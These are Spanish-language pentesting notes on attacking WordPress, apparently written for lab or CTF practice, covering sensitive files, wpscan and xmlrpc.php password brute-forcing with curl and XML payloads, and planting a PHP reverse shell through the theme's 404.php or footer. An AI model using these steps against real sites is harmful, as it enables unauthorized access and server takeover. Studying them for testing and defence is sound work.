### Ficheros y lugares interesantes

*xlmrpc.php
*license.txt
*licencia.txt
*wp-config.php
*.htaccess
*wp-admin
*wp-login
*wp-content/plugins
*xmlrpc.php
### Cuando una web no se muestra bien

A veces cuando tenemos un wordpress, la pagina no se muestra correctamente (fondo blanco, todo descuadrado, sin formato, mal). Lo único que hay que hacer es comprobar que lo mas seguro es que haya virtual hosting, y se deba incluir la dirección IP en /etc/hosts
### Contraseñas por fuerza bruta en wordpress
Teniendo un usuario válido, se puede realizar lo siguiente
```bash
wpscan --url http://10.10.10.4:80 -U <usuario_valido> -P <diccionario>

```

### Contraseñas por fuerza bruta abusando de XMLRPC 
Con xmlrpc.php podemos intentar hacer ataques de fuerza bruta para descubrir contraseñas de usuarios conocidos.

#### Prueba con CURL

Teniendo un fichero **fichero.xml** con el siguiente contenido:

```xml
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

podemos hacer la siguiente petición
```bash
curl -s -X POST 'http://ip/xmlrpc.php' -d@fichero.xml
```

y recibiremos una respuesta con todos los métodos disponibles para utilizar con el xmlrpc. en este caso nos interesa el método: **wp.getUsersBlogs**

#### Explotación xmlrpc con CURL

Con el concepto anterior, se puede crear el **fichero.xml** con el siguiente contenido: 
```xml
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

donde sustituimos username por un usuario válido y en password vamos probando contraseñas. Luego hacemos la misma petición por curl que en el ejemplo. 

Esto lo ideal es automatizarlo en un script que lea contraseñas de un fichero y vaya probando una a una.

#### Explotación xmlrpc con Burpsuite

**PDTE DESARROLLO**

### Explotación editor de temas para obtener una reverse shell

En el editor de temas de wordpress, podemos editar los ficheros, por ejemplo, que se debe mostrar en caso de **error 404**

Basta con editar el 404.php e introducir el código para una reverse shell en php, y visitar esa página o meter mal a posta la url para que nos mande ahí.

### Inyectar PHP malicioso

Cuando podemos subir ficheros, es tan facil como subir una reverse shell y luego ejecutarla, pero cuando no tenemos permisos para crear posts o subir ficheros podemos intentar inyectar el PHP malicioso de otra forma.

#### Inyectar PHP malicioso en TEMA de WORDPRESS
Menú lateral > Appeareance > Themes. Luego a la derecha, en **Theme footer** , y ahí podemos inyectar un código con una reverse shell que luego al visitar la web se va a interpretar.
